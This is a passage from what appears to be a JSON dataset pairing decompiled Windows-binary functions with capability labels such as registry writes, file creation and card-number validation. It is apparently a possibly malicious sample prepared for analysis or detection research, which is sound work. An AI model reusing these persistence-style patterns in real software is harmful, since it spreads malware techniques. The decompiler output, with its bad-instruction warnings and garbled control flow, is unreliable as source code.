        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404648) overlaps instruction at (ram,0x00404646)\n// \n// WARNING: Removing unreachable block (ram,0x00404645)\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00404600(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *extraout_ECX;\n    uint *arg_ch;\n    uint *puVar4;\n    int32_t *piVar5;\n    uint8_t uVar6;\n    uint8_t in_AF;\n    char cVar7;\n    char cVar8;\n    unkbyte10 extraout_ST0;\n    ulong uVar9;\n    uchar lpBuffer;\n    uint var_20fh;\n    uint s;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    lpBuffer = 0;\n    s._0_1_ = 0;\n    puVar4 = &var_20fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    uVar6 = 0;\n    cVar8 = '\\0';\n    cVar7 = 0;\n    puVar4 = &s + 1;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    // WARNING: Bad instruction - Truncating control flow here\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    uVar9 = (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x411184, &lpBuffer, arg_8h);\n    puVar4 = uVar9 >> 0x20;\n    uVar2 = uVar9;\n    if ((cVar7) || (!cVar7)) {\n        arg_ch = &var_8h;\n        puVar4 = &var_4h;\n    }\n    else {\n        uVar6 = 0x7207b272 < uVar2;\n        cVar8 = SCARRY4(uVar2, -0x7207b273);\n        cVar7 = uVar2 + 0x8df84d8d < 0;\n        arg_ch = extraout_ECX;\n    }\n    uVar9 = fcn.00404d50(puVar4, arg_ch);\n    piVar5 = uVar9 >> 0x20;\n    uVar2 = var_4h;\n    if ((cVar8 == cVar7) && (cVar8 != cVar7)) {\n        *(uVar9 + -0x7ce92414) = extraout_ST0;\n        uVar2 = uVar9 - 1;\n        uVar1 = uVar2;\n        in_AF = 9 < (uVar1 & 0xf) | in_AF;\n        uVar1 = uVar1 + in_AF * '\\x06';\n        *piVar5 = *piVar5 + 0x458bdf84;\n        uVar2 = uVar2 & 0xffffff00 | uVar1 + (0x90 < (uVar1 & 0xf0) | uVar6 | in_AF * (0xf9 < uVar1)) * '`';\n    }\n    fcn.00404740(uVar2);\n    iVar3 = fcn.004010e0(&s, var_4h, var_8h);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    fcn.00402440(&s, 0xffffffff);\n    return 1;\n}\n",
        "token_count": 910
    },
    "00404980": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00404980(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t unaff_EDI;\n    char *pcVar4;\n    float10 extraout_ST0;\n    uint var_4h;\n    \n    uVar3 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    iVar2 = fcn.004040a0(uVar3 - 4);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if ((-1 < iVar2) && (-1 >= iVar2)) {\n        *(unaff_EDI + 0x1c) = extraout_ST0;\n    }\n    if (*(uVar3 - 4) == 0) {\n        return false;\n    }\n    iVar2 = -1;\n    pcVar4 = *(uVar3 - 4);\n    do {\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x411338, 0x411378, 1, *(uVar3 - 4));\n    return iVar2 == 0;\n}\n",
        "token_count": 314
    },
    "00404de0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404de0(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint *unaff_EBP;\n    bool bVar4;\n    uint auStack20 [2];\n    \n    bVar4 = *0x42164c == 0;\n    if (bVar4) {\n        if ((!bVar4) && (bVar4)) {\n            puVar3 = auStack20 + 1;\n            cVar1 = '\\x10';\n            do {\n                unaff_EBP = unaff_EBP + -1;\n                puVar3 = puVar3 + -1;\n                *puVar3 = *unaff_EBP;\n                cVar1 = cVar1 + -1;\n            } while ('\\0' < cVar1);\n        }\n        uVar2 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar2);\n        *0x42164c = 1;\n    }\n    return;\n}\n",
        "token_count": 230
    },
    "00404c10": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404c10(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00404b80": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404bb7) overlaps instruction at (ram,0x00404bb3)\n// \n// WARNING: Removing unreachable block (ram,0x00404bdb)\n\nint32_t __cdecl fcn.00404b80(uint32_t arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t **unaff_EDI;\n    bool bVar3;\n    bool bVar4;\n    \n    while( true ) {\n        bVar3 = false;\n        bVar4 = arg_10h == NULL;\n        piVar2 = arg_10h;\n        if (bVar4) break;\n        while (((bVar3 || (!bVar3)) || (arg_8h = arg_8h - 1,  arg_8h == 0 || !bVar4))) {\n            iVar1 = *piVar2;\n            *unaff_EDI = piVar2 + 1;\n            *0x33b8ebcf = *0x33b8ebcf << 2;\n            arg_8h = arg_8h + *0x9750e2b5;\n            if (arg_8h >> 0x10 != 0) {\n                arg_8h = (arg_8h >> 0x10) + (arg_8h & 0xffff);\n            }\n            bVar3 = 0xfffffffd < iVar1 >> 0x1f;\n            piVar2 = 0x33b8ec43;\n            bVar4 = false;\n        }\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 382
    },
    "004041f0": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.004041f0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x411338, 0x41137c, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 79
    }
}